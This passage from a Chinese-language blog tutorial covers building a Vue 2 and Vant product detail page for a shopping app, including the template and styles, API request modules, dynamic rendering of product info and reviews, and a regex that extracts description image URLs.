class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="prodetail"&gt;</span><br><span class="line">    &lt;van-nav-bar</span><br><span class="line">      fixed</span><br><span class="line">      title="商品详情页"</span><br><span class="line">      left-arrow</span><br><span class="line">      @click-left="$router.go(-1)"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;van-swipe :autoplay="3000" @change="onChange"&gt;</span><br><span class="line">      &lt;van-swipe-item v-for="(image, index) in images" :key="index"&gt;</span><br><span class="line">        &lt;img :src="image" /&gt;</span><br><span class="line">      &lt;/van-swipe-item&gt;</span><br><span class="line"></span><br><span class="line">      &lt;template #indicator&gt;</span><br><span class="line">        &lt;div class="custom-indicator"&gt;</span><br><span class="line">          {{ current + 1 }} / {{ images.length }}</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/van-swipe&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 商品说明 --&gt;</span><br><span class="line">    &lt;div class="info"&gt;</span><br><span class="line">      &lt;div class="title"&gt;</span><br><span class="line">        &lt;div class="price"&gt;</span><br><span class="line">          &lt;span class="now"&gt;￥0.01&lt;/span&gt;</span><br><span class="line">          &lt;span class="oldprice"&gt;￥6699.00&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="sellcount"&gt;已售1001件&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="msg text-ellipsis-2"&gt;</span><br><span class="line">        三星手机 SAMSUNG Galaxy S23 8GB+256GB 超视觉夜拍系统 超清夜景 悠雾紫</span><br><span class="line">        5G手机 游戏拍照旗舰机s23</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="service"&gt;</span><br><span class="line">        &lt;div class="left-words"&gt;</span><br><span class="line">          &lt;span&gt;&lt;van-icon name="passed" /&gt;七天无理由退货&lt;/span&gt;</span><br><span class="line">          &lt;span&gt;&lt;van-icon name="passed" /&gt;48小时发货&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="right-icon"&gt;</span><br><span class="line">          &lt;van-icon name="arrow" /&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 商品评价 --&gt;</span><br><span class="line">    &lt;div class="comment"&gt;</span><br><span class="line">      &lt;div class="comment-title"&gt;</span><br><span class="line">        &lt;div class="left"&gt;商品评价 (5条)&lt;/div&gt;</span><br><span class="line">        &lt;div class="right"&gt;查看更多 &lt;van-icon name="arrow" /&gt;&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="comment-list"&gt;</span><br><span class="line">        &lt;div class="comment-item" v-for="item in 3" :key="item"&gt;</span><br><span class="line">          &lt;div class="top"&gt;</span><br><span class="line">            &lt;img</span><br><span class="line">              src="http://cba.itlike.com/public/uploads/10001/20230321/a0db9adb2e666a65bc8dd133fbed7834.png"</span><br><span class="line">              alt=""</span><br><span class="line">            /&gt;</span><br><span class="line">            &lt;div class="name"&gt;神雕大侠&lt;/div&gt;</span><br><span class="line">            &lt;van-rate</span><br><span class="line">              :size="16"</span><br><span class="line">              :value="5"</span><br><span class="line">              color="#ffd21e"</span><br><span class="line">              void-icon="star"</span><br><span class="line">              void-color="#eee"</span><br><span class="line">            /&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">          &lt;div class="content"&gt;质量很不错 挺喜欢的&lt;/div&gt;</span><br><span class="line">          &lt;div class="time"&gt;2023-03-21 15:01:35&lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 商品描述 --&gt;</span><br><span class="line">    &lt;div class="desc"&gt;</span><br><span class="line">      &lt;img</span><br><span class="line">        src="https://uimgproxy.suning.cn/uimg1/sop/commodity/kHgx21fZMWwqirkMhawkAw.jpg"</span><br><span class="line">        alt=""</span><br><span class="line">      /&gt;</span><br><span class="line">      &lt;img</span><br><span class="line">        src="https://uimgproxy.suning.cn/uimg1/sop/commodity/0rRMmncfF0kGjuK5cvLolg.jpg"</span><br><span class="line">        alt=""</span><br><span class="line">      /&gt;</span><br><span class="line">      &lt;img</span><br><span class="line">        src="https://uimgproxy.suning.cn/uimg1/sop/commodity/2P04A4Jn0HKxbKYSHc17kw.jpg"</span><br><span class="line">        alt=""</span><br><span class="line">      /&gt;</span><br><span class="line">      &lt;img</span><br><span class="line">        src="https://uimgproxy.suning.cn/uimg1/sop/commodity/MT4k-mPd0veQXWPPO5yTIw.jpg"</span><br><span class="line">        alt=""</span><br><span class="line">      /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 底部 --&gt;</span><br><span class="line">    &lt;div class="footer"&gt;</span><br><span class="line">      &lt;div class="icon-home"&gt;</span><br><span class="line">        &lt;van-icon name="wap-home-o" /&gt;</span><br><span class="line">        &lt;span&gt;首页&lt;/span&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="icon-cart"&gt;</span><br><span class="line">        &lt;van-icon name="shopping-cart-o" /&gt;</span><br><span class="line">        &lt;span&gt;购物车&lt;/span&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="btn-add"&gt;加入购物车&lt;/div&gt;</span><br><span class="line">      &lt;div class="btn-buy"&gt;立刻购买&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default {</span><br><span class="line">  name: "ProDetail",</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      images: [</span><br><span class="line">        "https://img01.yzcdn.cn/vant/apple-1.jpg",</span><br><span class="line">        "https://img01.yzcdn.cn/vant/apple-2.jpg",</span><br><span class="line">      ],</span><br><span class="line">      current: 0,</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  methods: {</span><br><span class="line">    onChange(index) {</span><br><span class="line">      this.current = index;</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.prodetail {</span><br><span class="line">  padding-top: 46px;</span><br><span class="line">  ::v-deep .van-icon-arrow-left {</span><br><span class="line">    color: #333;</span><br><span class="line">  }</span><br><span class="line">  img {</span><br><span class="line">    display: block;</span><br><span class="line">    width: 100%;</span><br><span class="line">  }</span><br><span class="line">  .custom-indicator {</span><br><span class="line">    position: absolute;</span><br><span class="line">    right: 10px;</span><br><span class="line">    bottom: 10px;</span><br><span class="line">    padding: 5px 10px;</span><br><span class="line">    font-size: 12px;</span><br><span class="line">    background: rgba(0, 0, 0, 0.1);</span><br><span class="line">    border-radius: 15px;</span><br><span class="line">  }</span><br><span class="line">  .desc {</span><br><span class="line">    width: 100%;</span><br><span class="line">    overflow: scroll;</span><br><span class="line">    ::v-deep img {</span><br><span class="line">      display: block;</span><br><span class="line">      width: 100% !important;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  .info {</span><br><span class="line">    padding: 10px;</span><br><span class="line">  }</span><br><span class="line">  .title {</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    .now {</span><br><span class="line">      color: #fa2209;</span><br><span class="line">      font-size: 20px;</span><br><span class="line">    }</span><br><span class="line">    .oldprice {</span><br><span class="line">      color: #959595;</span><br><span class="line">      font-size: 16px;</span><br><span class="line">      text-decoration: line-through;</span><br><span class="line">      margin-left: 5px;</span><br><span class="line">    }</span><br><span class="line">    .sellcount {</span><br><span class="line">      color: #959595;</span><br><span class="line">      font-size: 16px;</span><br><span class="line">      position: relative;</span><br><span class="line">      top: 4px;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  .msg {</span><br><span class="line">    font-size: 16px;</span><br><span class="line">    line-height: 24px;</span><br><span class="line">    margin-top: 5px;</span><br><span class="line">  }</span><br><span class="line">  .service {</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    line-height: 40px;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">    font-size: 16px;</span><br><span class="line">    background-color: #fafafa;</span><br><span class="line">    .left-words {</span><br><span class="line">      span {</span><br><span class="line">        margin-right: 10px;</span><br><span class="line">      }</span><br><span class="line">      .van-icon {</span><br><span class="line">        margin-right: 4px;</span><br><span class="line">        color: #fa2209;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  .comment {</span><br><span class="line">    padding: 10px;</span><br><span class="line">  }</span><br><span class="line">  .comment-title {</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    .right {</span><br><span class="line">      color: #959595;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  .comment-item {</span><br><span class="line">    font-size: 16px;</span><br><span class="line">    line-height: 30px;</span><br><span class="line">    .top {</span><br><span class="line">      height: 30px;</span><br><span class="line">      display: flex;</span><br><span class="line">      align-items: center;</span><br><span class="line">      margin-top: 20px;</span><br><span class="line">      img {</span><br><span class="line">        width: 20px;</span><br><span class="line">        height: 20px;</span><br><span class="line">      }</span><br><span class="line">      .name {</span><br><span class="line">        margin: 0 10px;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    .time {</span><br><span class="line">      color: #999;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  .footer {</span><br><span class="line">    position: fixed;</span><br><span class="line">    left: 0;</span><br><span class="line">    bottom: 0;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 55px;</span><br><span class="line">    background-color: #fff;</span><br><span class="line">    border-top: 1px solid #ccc;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-evenly;</span><br><span class="line">    align-items: center;</span><br><span class="line">    .icon-home,</span><br><span class="line">    .icon-cart {</span><br><span class="line">      display: flex;</span><br><span class="line">      flex-direction: column;</span><br><span class="line">      align-items: center;</span><br><span class="line">      justify-content: center;</span><br><span class="line">      font-size: 14px;</span><br><span class="line">      .van-icon {</span><br><span class="line">        font-size: 24px;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    .btn-add,</span><br><span class="line">    .btn-buy {</span><br><span class="line">      height: 36px;</span><br><span class="line">      line-height: 36px;</span><br><span class="line">      width: 120px;</span><br><span class="line">      border-radius: 18px;</span><br><span class="line">      background-color: #ffa900;</span><br><span class="line">      text-align: center;</span><br><span class="line">      color: #fff;</span><br><span class="line">      font-size: 14px;</span><br><span class="line">    }</span><br><span class="line">    .btn-buy {</span><br><span class="line">      background-color: #fe5630;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.tips {</span><br><span class="line">  padding: 10px;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>封装获取商品详情的请求模块 <code>api/goodsDetail.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">"@/utils/request"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取商品详情</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getGoodsDetail</span> = (<span class="params">goodsId</span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">get</span>(<span class="string">"/goods/detail"</span>, {</span><br><span class="line">    <span class="attr">params</span>: {</span><br><span class="line">      goodsId,</span><br><span class="line">    },</span><br><span class="line">  });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>获取的一个示例：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408301539204.png" alt="image-20240830153951035"></p><p>于是进行动态渲染</p><h3 id="商品说明动态渲染"><a class="markdownIt-Anchor" href="#商品说明动态渲染"></a> 商品说明动态渲染</h3><p>改造 template 中对图片的渲染：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;van-swipe-item v-for="(image, index) in images" :key="index"&gt;</span><br><span class="line">        &lt;img :src="image.external_url" /&gt;</span><br><span class="line">      &lt;/van-swipe-item&gt;</span><br></pre></td></tr></tbody></table></figure><p>script 部分如下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">import</span> { getGoodsDetail } <span class="keyword">from</span> <span class="string">'@/api/goodsDetail'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">name</span>: <span class="string">'ProDetail'</span>,</span><br><span class="line">  <span class="attr">computed</span>: {</span><br><span class="line">    <span class="title function_">detailId</span> () {</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">params</span>.<span class="property">id</span></span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">created</span> () {</span><br><span class="line">    <span class="keyword">const</span> goodsId = <span class="variable language_">this</span>.<span class="property">detailId</span></span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">getGoodsDetail</span>(goodsId)</span><br><span class="line">    <span class="comment">// console.log(res)</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">goodsObj</span> = res.<span class="property">data</span>.<span class="property">detail</span></span><br><span class="line">    <span class="comment">// console.log(this.goodsObj)</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">images</span> = <span class="variable language_">this</span>.<span class="property">goodsObj</span>.<span class="property">goods_images</span></span><br><span class="line">  },</span><br><span class="line">  <span class="title function_">data</span> () {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      <span class="attr">goodsObj</span>: {},</span><br><span class="line">      <span class="attr">images</span>: [],</span><br><span class="line">      <span class="attr">current</span>: <span class="number">0</span></span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">methods</span>: {</span><br><span class="line">    <span class="title function_">onChange</span> (index) {</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">current</span> = index</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>修改商品说明进行动态渲染：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 商品说明 --&gt;</span><br><span class="line">    &lt;div class="info"&gt;</span><br><span class="line">      &lt;div class="title"&gt;</span><br><span class="line">        &lt;div class="price"&gt;</span><br><span class="line">          &lt;span class="now"&gt;￥{{ goodsObj.goods_price_min }}&lt;/span&gt;</span><br><span class="line">          &lt;span class="oldprice"&gt;￥{{ goodsObj.goods_price_max }}&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="sellcount"&gt;已售{{ goodsObj.goods_sales }}件&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="msg text-ellipsis-2"&gt;</span><br><span class="line">        {{ goodsObj.goods_name }}</span><br><span class="line">      &lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>到这里还没有完成评论区的动态渲染</p><h3 id="商品评论区渲染"><a class="markdownIt-Anchor" href="#商品评论区渲染"></a> 商品评论区渲染</h3><p>封装请求获取商品评价详情的模块 <code>api/goodsDetail.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取商品评价详情</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getGoodsCommentDetail</span> = (<span class="params">obj</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> { scoreType, goodsId, page } = obj;</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">get</span>(<span class="string">"/comment/list"</span>, {</span><br><span class="line">    <span class="attr">params</span>: {</span><br><span class="line">      scoreType,</span><br><span class="line">      goodsId,</span><br><span class="line">      page,</span><br><span class="line">    },</span><br><span class="line">  });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>请求解构：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408301611303.png" alt="image-20240830161142137"></p><p>完成商品评价渲染（默认只展示三条评价）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 商品评价 --&gt;</span><br><span class="line">    &lt;div class="comment"&gt;</span><br><span class="line">      &lt;div class="comment-title"&gt;</span><br><span class="line">        &lt;div class="left"&gt;商品评价 ({{ goodsCommentArray.length }}条)&lt;/div&gt;</span><br><span class="line">        &lt;div class="right" @click="$router.push(`/productComment?id=${detailId}`)"&gt;查看更多 &lt;van-icon name="arrow" /&gt; &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="comment-list"&gt;</span><br><span class="line">        &lt;div class="comment-item" v-for="(item, index) in goodsCommentArray" :key="item.comment_id"&gt;</span><br><span class="line">          &lt;div class="top" v-if="index &lt; 3"&gt;</span><br><span class="line">            &lt;img :src="item.user.avatar_url ? item.user.avatar_url : defaultAvatar" alt=""&gt;</span><br><span class="line">            &lt;div class="name"&gt;{{item.user.nick_name}}&lt;/div&gt;</span><br><span class="line">            &lt;van-rate :size="16" :value="item.score" color="#ffd21e" void-icon="star" void-color="#eee"/&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">          &lt;div class="content" v-if="index &lt; 3"&gt;</span><br><span class="line">            {{item.content}}</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">          &lt;div class="time" v-if="index &lt; 3"&gt;</span><br><span class="line">            {{item.create_time}}</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>在生命周期钩子 created 中：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">created</span> () {</span><br><span class="line">    <span class="comment">// 获取商品详情-说明部分</span></span><br><span class="line">    <span class="keyword">const</span> goodsId = <span class="variable language_">this</span>.<span class="property">detailId</span></span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">getGoodsDetail</span>(goodsId)</span><br><span class="line">    <span class="comment">// console.log(res)</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">goodsDetailObj</span> = res.<span class="property">data</span>.<span class="property">detail</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">images</span> = <span class="variable language_">this</span>.<span class="property">goodsDetailObj</span>.<span class="property">goods_images</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取商品详情-评价部分</span></span><br><span class="line">    <span class="keyword">const</span> commentRes = <span class="keyword">await</span> <span class="title function_">getGoodsCommentDetail</span>({</span><br><span class="line">      <span class="attr">scoreType</span>: <span class="number">10</span>, <span class="comment">// 默认抓取好评</span></span><br><span class="line">      <span class="attr">goodsId</span>: goodsId,</span><br><span class="line">      <span class="attr">page</span>: <span class="number">1</span></span><br><span class="line">    })</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">goodsCommentArray</span> = commentRes.<span class="property">data</span>.<span class="property">list</span>.<span class="property">data</span></span><br><span class="line">  },</span><br></pre></td></tr></tbody></table></figure><p>data 提供：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">data</span> () {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      <span class="attr">defaultAvatar</span>: <span class="string">'https://.../coding/202408301648039.png'</span>,</span><br><span class="line">      <span class="attr">goodsDetailObj</span>: {}, <span class="comment">// 商品说明</span></span><br><span class="line">      <span class="attr">goodsCommentArray</span>: {}, <span class="comment">// 商品评价</span></span><br><span class="line">      <span class="attr">images</span>: [],</span><br><span class="line">      <span class="attr">current</span>: <span class="number">0</span></span><br><span class="line">    }</span><br><span class="line">  },</span><br></pre></td></tr></tbody></table></figure><p>现在剩下商品说明的图片未渲染、商品评论区未渲染</p><h3 id="商品说明的图片渲染"><a class="markdownIt-Anchor" href="#商品说明的图片渲染"></a> 商品说明的图片渲染</h3><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408310104868.png" alt="image-20240830174412273"><br>接口返回的数据中 content 就是商品详细说明的图：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408310105026.png" alt="image-20240830174505655"></p><p>于是再于 data 中提供两个数据用于处理：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">imgSrcRegex</span>: <span class="regexp">/&lt;img[^&gt;]+src="([^"&gt;]+)"/g</span>, <span class="comment">// 匹配接口数据html中的src图</span></span><br><span class="line"><span class="attr">imgSrcArray</span>: [], <span class="comment">// 商品详细介绍长图</span></span><br></pre></td></tr></tbody></table></figure><p>再到 created 中编写：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">created</span> () {</span><br><span class="line">    <span class="comment">// 获取商品详情-说明部分</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取商品详情-评价部分</span></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正则匹配得到商品详细介绍长图</span></span><br><span class="line">    <span class="keyword">const</span> htmlString = <span class="variable language_">this</span>.<span class="property">goodsDetailObj</span>.<span class="property">content</span></span><br><span class="line">    <span class="keyword">const</span> srcArray = []</span><br><span class="line">    <span class="keyword">const</span> regex = <span class="regexp">/&lt;img\s+[^&gt;]*src="([^"]*)"/g</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> match</span><br><span class="line">    <span class="keyword">while</span> ((match = regex.<span class="title function_">exec</span>(htmlString)) !== <span class="literal">null</span>) {</span><br><span class="line">      srcArray.<span class="title function_">push</span>(match[<span class="number">1</span>]) <span class="comment">// 将匹配到的 src URL 添加到数组中</span></span><br><span class="line">    }</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">imgSrcArray</span> = srcArray</span><br><span class="line">    <span class="comment">// console.log(this.imgSrcArray) // 输出结果数组</span></span><br><span class="line">  },</span><br></pre></td></tr></tbody></table></figure><p>接下来就剩下完全的评价区渲染了。</p><h2 id="商品评价区"><a class="markdownIt-Anchor" href="#商品评价区"></a> 商品评价区</h2><p>这是一个新的页面所以直接新建了。<code>views/productdetail/evaluation.vue</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 